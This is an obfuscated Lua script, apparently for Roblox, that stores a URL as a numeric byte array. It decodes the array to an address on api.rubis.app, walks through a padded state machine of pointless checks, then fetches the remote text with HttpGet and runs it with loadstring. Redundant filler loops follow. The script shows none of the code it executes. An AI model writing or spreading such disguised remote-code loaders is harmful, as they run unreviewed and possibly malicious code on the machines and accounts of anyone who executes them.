local env = getfenv(0)
local str = string
local tbl = table
local math_m = math
local game_s = env.game
local http_get = game_s.HttpGet
local load_s = env.loadstring

local _1 = {}
local _2 = {}
local _3 = {}
local _4 = {}
local _5 = {}
local _6 = {}

local function decode_single_char(val)
    local math_1 = val * 1
    local math_2 = math_1 + 0
    local math_3 = math_2 - 0
    local math_4 = math_3 / 1
    local math_5 = math.floor(math_4)
    local math_6 = math_5 % 256
    return str.char(math_6)
end

local function complex_decode(arr)
    local result = ""
    for i = 1, #arr do
        result = result .. decode_single_char(arr[i])
    end
    return result
end

local _7 = {
    104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 
    105, 46, 114, 117, 98, 105, 115, 46, 97, 112, 
    112, 47, 118, 50, 47, 115, 99, 114, 97, 112, 
    47, 86, 85, 121, 52, 90, 104, 121, 76, 100, 
    82, 57, 49, 74, 78, 115, 51, 47, 114, 97, 119
}

local _8 = complex_decode(_7)

local function execute_payload(url)
    local fetched = http_get(game_s, url)
    if fetched then
        local chunk = load_s(fetched)
        if chunk then
            chunk()
        end
    end
end

local _9 = 1
local _10 = false

while not _10 do
    if _9 == 1 then
        _1[1] = "Initializing"
        _9 = 2
    elseif _9 == 2 then
        _2[1] = "Decoding"
        _9 = 3
    elseif _9 == 3 then
        _3[1] = "Loading"
        _9 = 4
    elseif _9 == 4 then
        _4[1] = "Executing"
        _9 = 5
    elseif _9 == 5 then
        _5[1] = "Finished"
        _9 = 6
    elseif _9 == 6 then
        local check_1 = _1[1] == "Initializing"
        local check_2 = _2[1] == "Decoding"
        local check_3 = _3[1] == "Loading"
        local check_4 = _4[1] == "Executing"
        local check_5 = _5[1] == "Finished"
        
        if check_1 and check_2 and check_3 and check_4 and check_5 then
            _9 = 7
        else
            _9 = 1
        end
    elseif _9 == 7 then
        local math_check = (10 * 10) - (50 * 2) + 100
        if math_check == 100 then
            _9 = 8
        end
    elseif _9 == 8 then
        local string_check = str.reverse(str.reverse("test"))
        if string_check == "test" then
            _9 = 9
        end
    elseif _9 == 9 then
        local table_check = #tbl.concat({"a", "b"})
        if table_check == 2 then
            _9 = 10
        end
    elseif _9 == 10 then
        execute_payload(_8)
        _10 = true
    else
        _10 = true
    end
end

local _11 = {
    [1] = "a", [2] = "b", [3] = "c", [4] = "d", [5] = "e",
    [6] = "f", [7] = "g", [8] = "h", [9] = "i", [10] = "j",
    [11] = "k", [12] = "l", [13] = "m", [14] = "n", [15] = "o",
    [16] = "p", [17] = "q", [18] = "r", [19] = "s", [20] = "t",
    [21] = "u", [22] = "v", [23] = "w", [24] = "x", [25] = "y",
    [26] = "z"
}

local _12 = 0
for i = 1, #_11 do
    _12 = _12 + 1
end

local _13 = 0
for i = 1, #_11 do
    _13 = _13 + 1
end

local _14 = 0
for i = 1, #_11 do
    _14 = _14 + 1
end

local _15 = 0
for i = 1, #_11 do
    _15 = _15 + 1
end

local _16 = 0
for i = 1, #_11 do
    _16 = _16 + 1
end

local _17 = 0
for i = 1, #_11 do
    _17 = _17 + 1
end

local _18 = 0
for i = 1, #_11 do
    _18 = _18 + 1
end

local _19 = 0
for i = 1, #_11 do
    _19 = _19 + 1
end

local _20 = 0
for i = 1, #_11 do
    _20 = _20 + 1
end
